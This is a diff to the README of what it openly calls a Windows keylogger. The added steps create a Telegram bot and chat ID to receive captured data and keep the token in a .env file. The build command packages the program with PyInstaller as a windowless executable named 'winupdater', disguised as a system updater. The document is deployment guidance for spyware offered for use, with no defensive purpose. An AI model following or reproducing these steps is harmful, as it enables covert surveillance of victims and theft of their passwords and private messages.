@@ -10,9 +10,27 @@
 
 ---
 
+## 💡 Preparation
+
+1) Create your own bot with `@BotFather`:
+- Search for `@BotFather` in Telegram and follow the instructions
+- Send /newbot
+- Specify the bot name (for example: MyOwnBot)
+- Get a token like 123456789:AAFm2e4f5g6h7i8j9k0l1m2n9o4p5q6r7s8
+
+2) Find out your Chat ID: 
+- Add the [userinfobot](https://t.me/userinfobot)
+- Send any message to this bot
+- It will reply with your Chat ID
+
+### Save the received:
+
+TELEGRAM_BOT_TOKEN
+TELEGRAM_CHAT_ID
+
 ## ⚙️ Configuration
 
-- Open the `logger_bot.py` file and set the following values:
+- Create a `.env` file and set the following values:
 
 ```python
 # ===== Configuration =====
@@ -58,7 +76,7 @@ pip install pyinstaller pynput python-telegram-bot psutil
 - In the project folder, run:
 
 ```cmd
-pyinstaller --noconsole --onefile --name winupdater logger_bot.py
+pyinstaller --noconsole --onefile --name winupdater logger_boy_V2.py
 ```
 
 - After successful build, your `.exe` file will appear in the `dist/` folder.
@@ -84,7 +102,6 @@ pyinstaller --noconsole --onefile --name winupdater logger_bot.py
 
 ## 💡 Final Notes
 
-- Creating a Telegram bot is easy — search for `@BotFather` in Telegram and follow the instructions.  
 - This keylogger was built specifically for **Windows** and may require adjustments for non-standard environments.
 
 ---
